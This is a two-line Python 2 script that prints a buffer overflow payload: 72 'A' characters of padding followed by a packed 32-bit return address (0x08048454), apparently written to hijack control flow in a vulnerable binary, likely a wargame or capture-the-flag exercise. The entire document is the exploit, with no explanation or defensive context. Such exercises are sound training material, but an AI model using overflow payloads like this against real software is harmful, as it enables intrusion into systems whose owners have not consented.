import struct

print "A" * 72 + struct.pack('I', 0x08048454)
